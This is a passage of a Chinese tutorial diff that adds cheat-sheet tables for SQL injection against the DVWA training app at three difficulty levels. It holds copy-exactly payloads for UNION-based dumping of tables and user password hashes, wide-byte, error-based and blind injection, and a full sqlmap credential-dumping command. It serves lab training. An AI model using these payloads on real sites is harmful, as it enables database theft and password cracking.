+| 4 | **第四步，UNION SELECT 找显示位（哪列数据最后显示在页面上）** | 填：`-1' UNION SELECT 1,2 -- -`（id 填 -1 是为了让前面那个 SELECT 返回空行，只有 UNION 后面的 2 列能显示，直接看到哪列对应 First name / Surname） | 返回 First name = 1 / Surname = 2 → 说明 **第 1 列显示 First name，第 2 列显示 Surname** ✅ | 【全是 admin 的数据 1,2 根本没出现】→ 你 id 填的是 `1` 不是 `-1`！前面的 id=1 返回的真实数据占用了那一行，UNION 的 1,2 被推到了第二行你没看到；如果只允许 LIMIT 1（Low 有的版本），那必须用 -1 或者 NULL 让原始查询为空 |
+| 5 | **第五步，把 database() / user() / version() 放到显示位，爆数据库信息** | 显示位 2 是 Surname，填：<br>`-1' UNION SELECT 1, CONCAT_WS(0x3a, database(), user(), version()) -- -`（0x3a 是冒号 `:` 的十六进制，CONCAT_WS 把三个信息用冒号拼一起不会有编码问题）| 返回 Surname = `dvwa:root@localhost:8.0.35`（格式=数据库:用户名@主机:MySQL版本）= 成功爆信息 ✅ | 【Surname 只出一半 / 有乱码】→ CONCAT_WS 换成 GROUP_CONCAT，或者你把第 1 列也换成 database() 试：`-1' UNION SELECT database(), user() -- -`；【函数没执行 / 直接返回字符串 version()】→ 查 MySQL 是不是 MariaDB，MariaDB 函数一样，但有的禁用 user()，换 current_user() |
+| 6 | **第六步，爆表 + 爆列 + 爆管理员密码（终极！）** | ① 先爆所有表：<br>`-1' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() -- -` → 看到 users 表<br>② 爆 users 列：<br>`-1' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' -- -` → 看到 user_id / first_name / last_name / user / password 等列<br>③ 爆账密（核心！）：<br>`-1' UNION SELECT 1, group_concat(user,0x3a,password,0x0a) FROM users -- -` | 第 ③ 步返回一串 `admin:21232f297a57a5a743894a0e4a801fc3 ↵ gordonb:e99a18c428cb38d5f260853678922e03 ...` → 每对是 用户名:MD5 值，拿去 cmd5 或 https://www.somd5.com 解密（admin 那个 MD5 就是密码 admin）= 通关！🎉 | 【第 ② 步报错 Unknown column 'users' in where clause】→ 引号被转义了？Low 应该不会啊！哦，你把 table_name='users' 的单引号写成中文引号了！或者你编码了 → 更稳妥写法：`table_name=0x7573657273`（users 的十六进制编码，不依赖单引号）；【第 ③ 步 group_concat 被截断了显示不全】→ 加 LIMIT 一条条看：`-1' UNION SELECT user,password FROM users LIMIT 0,1 -- -`（LIMIT 0,1 看第 1 条，1,1 第 2 条，...） |
+
+> 💡 **Low 级别查错口诀**：单引号报错 → 万能密码过 → ORDER BY N 报错时 N-1 = 列数 → UNION 要写 -1 才能看到 1,2 显示位。**99% 的错误要么是引号打错了（中文），要么是注释符 -- 后面没空格！**
+
 ---
 
 ## Medium级别：稍微有点难度了 🎯
@@ -692,6 +956,22 @@ if( isset( $_POST[ 'Submit' ] ) ) {
 
 这就是典型的"以为加了过滤就安全了，但其实过滤得不对"。
 
+### ✅ 表 10-2 · Medium 级别通关速查 & 失败对照表（转义单引号 = 直接上数字型注入 + Burp 改 POST 参数）
+
+Medium 源码核心是两句：① `$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_POST['id']);`（单引号/特殊字符全转义）；② SQL 语句变成 `SELECT ... WHERE user_id = $id;`（注意 **$id 两边没有单引号了！变成了数字型对比**）→ 所以**我们不需要用单引号，一个引号都不用，纯数字逻辑就能注入**。Medium 还改成了下拉框 POST 提交，所以得用 Burp 改 POST body：
+
+| 步骤 | 做什么 | Burp / 下拉框里填什么 | 看到什么算成功 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
+|---|---|---|---|---|
+| 0 | 切 Medium + 确认生效 + View Source 抄 SQL 结构 | 切 medium → Submit → 刷新 → SQLi 模块 → View Source | 源码里 `$query = "SELECT ... WHERE user_id = $id;";`（$id 没有任何引号），而且是 `$_POST['id']`（POST 请求不是 GET）→ 拿 Low 的 `1' OR '1'='1` 提交，现在应该只返回 admin 一条或显示转义后的 `1\'` = Medium 生效 | 【Low 版带单引号 payload 还能查出所有用户】→ 难度没切对！重新切、清缓存 |
+| 1 | 先下拉框正常选 1（确认 POST 请求的格式）→ Burp 抓包 | ① 代理打开 Intercept On；② 浏览器 SQLi 页面下拉框选 ID:1 点 Submit；③ Burp 抓到的 POST 请求 body 长这样：`id=1&Submit=Submit` | 抓到完整 POST 请求，Content-Type 是 application/x-www-form-urlencoded | 【抓不到包 / 下拉框选 1 不经过 Burp】→ ① 你 Burp 浏览器代理没配好 → 检查 FoxyProxy 开了没；② 有的版本 Medium 是 GET，那直接改 URL 参数就行，不用 Burp |
+| 2 | 🏆 **绕过法 ①（最简单，纯数字型，一个引号都不用！）：`1 OR 1=1`** | Burp 抓到的包 Send to Repeater → 把 `id=1` 改成 → `id=1 OR 1=1`（OR 前后空格有就好）→ Send | 响应里出现所有 5 位用户（admin / Gordon Brown / Hack Me / Pablo / 1337）= 注入成功 ✅ | 【还是一条 admin】→ ① 你写成 `1 or1=1` 了（or 后面没空格 MySQL 把 or1 当字段名！= 逻辑错）→ 严格写 `1 OR 1=1`；② 你没删单引号还加了 `'1'='1`？Medium 单引号被转义成 `\'`，`\'` 会把字符串打断，纯数字型不需要任何引号，去掉所有引号！ |
+| 3 | ORDER BY 猜列数（同样一个引号都不用！）| Repeater 里把 id 改成：`id=1 ORDER BY 2` → Send；再试 `id=1 ORDER BY 3` | ORDER BY 2 返回正常 admin，ORDER BY 3 返回 Unknown column '3' error = 还是 2 列 ✅ | 【ORDER BY 3 也不报错】→ 列数 > 2，继续试 4、5 直到报错，报错列数减一 |
+| 4 | UNION SELECT 显示位 + 爆信息 | id 改成：`id=-1 UNION SELECT 1, CONCAT_WS(0x3a, database(), user(), version())`（十六进制不需要引号！0x3a 就是冒号，或者直接连写 UNION SELECT 1,database() 也行） | Surname 列显示 `dvwa:root@localhost:8.x.x...` = 信息爆出 ✅ | 【全是乱码/没显示】→ 前面要写 -1 或 0，写 1 的话 UNION 第一条就是真的 admin 行，显示位被占了 |
+| 5 | 爆表 / 爆列 / 爆密码（**关键！表名列名不能写单引号，要么十六进制要么反引号**）| 爆表：<br>`id=-1 UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()`<br>爆 users 列：<br>`id=-1 UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=0x7573657273`<br>（`0x7573657273` 就是 "users" 的十六进制，避开了单引号）<br>爆账密：<br>`id=-1 UNION SELECT 1, group_concat(user,0x3a,password,0x0a) FROM users` | 第三步返回 admin:MD5 / gordonb:MD5 全列表，拿去 somd5 解密 = Medium 通关！🎉 | 【table_name='users' 报错 Unknown column 'users'】→ 你又写了单引号！Medium 单引号会被转义成 `\'`，**凡是字符串常量一律用 0xHEX 编码或 MySQL 的反引号 `users`（键盘 Tab 上面~那个键的反引号不是中文引号！）**；【group_concat 截断】→ 加 LIMIT X,1 一条条看 |
+| 6 | 次选绕过法（当你数字型也被拦时）：**宽字节注入 / GBK 编码** | 有的 Medium 版本设置了 SET NAMES gbk，可以尝试 `id=1%df' OR 1=1 -- -`（%df 加上被转义的 `\'` = `%df%5c` 合成 GBK 字"運"，吃掉反斜杠，后面的单引号就逃出来了！） | 返回所有用户 = 宽字节注入成功 ✅ | 【宽字节没用】→ 你 MySQL 字符集是 utf8mb4 不是 gbk，这个办法不适用。没关系，上面的数字型纯无引号注入已经能过了，不管它 |
+
+> 💡 **Medium 查错咒语：** 你脑子里记住一句"**Medium 的 SQL 里 $id 周围没有任何引号！**" → 所以你的 payload 里任何时候都不要写单引号！引号 = 被转义 = 逻辑断 = 失败。表名、字符串、冒号、换行，全部写 0xHEX。
+
 ---
 
 ## High级别：更难一点？没关系！🔥
@@ -838,6 +1118,22 @@ if( isset( $_SESSION[ 'id' ] ) ) {
 这个比较高级，新手暂时不用了解。
 
 总之，在DVWA的High级别里，我们用注释就轻松绕过了！💪
+
+### ✅ 表 10-3 · High 级别通关速查 & 失败对照表（加了 LIMIT 1 = 用注释符 # / -- - 截掉就好）
+
+DVWA High 级 SQLi 源码的 SQL：`SELECT ... WHERE user_id = '$id' LIMIT 1;` — 变化只有两点：① 回到 Low 的**字符型单引号包裹**（又能用 `'` 闭合了！）；② 末尾强行加了一个 `LIMIT 1`（最多只返回 1 行，影响 UNION 显示多结果 + 影响 OR 1=1 万能语句显示）。**解决办法就是在 payload 结尾写 # 或 -- - 把 LIMIT 1 整个注释掉**。按顺序测：
+
+| 步骤 | 先做什么 | 输入框 id 里填什么（**逐字抄！**） | 看到什么算成功 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
+|---|---|---|---|---|
+| 0 | 切 High + 确认 LIMIT 1 生效 + 确认还是字符型 | 切 high → Submit → 刷新 → SQLi 模块 → View Source → 抄 SQL 那行（应该带 `'$id' LIMIT 1`）| 确认 SQL 末尾真有 `LIMIT 1;` → 先拿 Low 版不带注释的 `1' OR '1'='1` 提交 → **只会返回 1 条 admin**（因为 LIMIT 1 把 OR 1=1 的 5 条截断了，只留第 1 行）= High 生效 ✅ | 【不带 LIMIT 返回 5 条 / OR 1=1 全出来了】→ 难度没切到 High！重新切 + 清缓存 |
+| 1 | 🏆 **绕过 LIMIT 1 最经典：末尾加 `#` 把 LIMIT 1 注释掉**（`#` 是 MySQL/MariaDB 的行内注释，后面整行忽略） | 输入：`1' OR 1=1 #`（# 前面有空格也行，# 后面的字符全忽略 = 原 SQL 里的 `LIMIT 1;` 被丢掉了）→ Submit | **这次返回 5 条用户了！**（admin / Gordon Brown / Hack Me / Pablo / 1337）= 成功绕过高限制 ✅ | 【# 不好用 / 报错 SQL syntax】→ 换成 `-- -` 注释（双横线 空格 任意字符，MySQL 标准注释写法）：`1' OR 1=1 -- -`（注意 -- 后面一定要有空格 + 字符 `-`，直接 `--` 有些版本不算注释）；另外两个都不好用的话就加 `%23`（# 的 URL 编码，GET 请求输入框里编码后更稳） |
+| 2 | 第二步：ORDER BY 猜列数（同样末尾加 #） | 填：`1' ORDER BY 2 #` → 再试 `1' ORDER BY 3 #` | ORDER BY 2 正常，ORDER BY 3 报 Unknown column '3' → 还是 2 列 ✅ | 【全不报错】→ 列数 > 2 继续往上试 |
+| 3 | 第三步：UNION SELECT 找显示位 + 爆信息（末尾加 # 截 LIMIT 1） | 填：`-1' UNION SELECT 1,2 #`（id=-1 让前面 SELECT 为空，后面 2 才能显示出来）→ 再升级：<br>`-1' UNION SELECT 1, CONCAT_WS(0x3a, database(), user(), version()) #` | 第二步 First name / Surname 分别显示 1 / 2 = 显示位确认；第三步 Surname 显示 `dvwa:root@localhost:8.x.x...` ✅ | 【UNION 全没 1,2，还是 admin/admin】→ 你写的是 `1'` 不是 `-1'`！改成 -1；或者写 `999'` 这种不可能存在的 id 也行 |
+| 4 | 第四步：爆表 / 爆列 / 爆密码 + 注释 LIMIT | 爆表：<br>`-1' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() #`<br>爆列：<br>`-1' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' #`<br>爆账密：<br>`-1' UNION SELECT 1, group_concat(user,0x3a,password,0x0a) FROM users #` | 第三步返回 用户名:MD5 值 完整 5 对，拿去 somd5 / cmd5.org 解出明文（admin=admin、gordonb=abc123、1337=charley、pablo=letmein、smithy=password）= High 通关！🎉 | 【报错 Unknown column 'users' / SQL 语法错】→ ① 末尾没加 # / -- -，LIMIT 1 从半路上切 SQL 让语法不完整！→ 检查末尾注释一定写上；② table_name='users' 的单引号又写成中文了 → 改英文；③ group_concat 显示被截断一半 → 用 LIMIT X,1 一行行读：`-1' UNION SELECT user,password FROM users LIMIT 0,1 #`（LIMIT 0,1 第 1 条，1,1 第 2 条... 这里两个 LIMIT 没问题，因为前面的 LIMIT 被 # 注释了，只留 UNION 里的 LIMIT） |
+| 5 | 次选绕过 LIMIT 1（当注释符都被拦了）：**用 PROCEDURE ANALYSE() / 时间盲注报错盲注** | 思路：真的被黑盒什么都不知道的情况下，用 sqlmap 一把梭：<br>`sqlmap -u "http://靶场IP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=你自己的; security=high" --batch --dbs --users --passwords` | sqlmap 自动识别 LIMIT 1、字符型、单引号，爆出所有账密 ✅ | 【sqlmap 提示 "the injectable parameter does not seem to be injectable"】→ Cookie 写错了！要么 PHPSESSID 过期要么 security=low/high 写错，重新登录 DVWA 抓 Cookie 再跑；加 `--level=5 --risk=3` 更狠一点 |
+| 6 | 终极绕过（High 有些 fork 版本会加 stripslashes + mysql_real_escape_string）：**报错注入 / 布尔盲注 / 时间盲注** | 报错注入（extractvalue + floor）payload：<br>`1' AND extractvalue(1,concat(0x7e, database())) #`<br>布尔盲注：猜 database() 长度 `1' AND length(database())=4 #`（返回 admin 就是长度 4）→ 再一位位猜 ASCII | extractvalue 报错信息里出现 `~dvwa` = 数据库名 成功爆出 ✅ | 【extractvalue / updatexml 函数不支持】→ MariaDB 老版本，换 floor 报错：`1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) #`；还是不行就回 sqlmap，它会自动选技术栈 |
+
+> 🔥 **High 查错口诀：** 字符型回 Low 的单引号了 + 多了个 LIMIT 1 截断 UNION。**凡是 High 写 payload，末尾养成习惯写个 #** — 写了 # 就当 Low 去做，99% 都直接过。# 被拦就换 `-- -`，再被拦换 `%23`（URL 编码版），三选一必中。
 
 ---
 
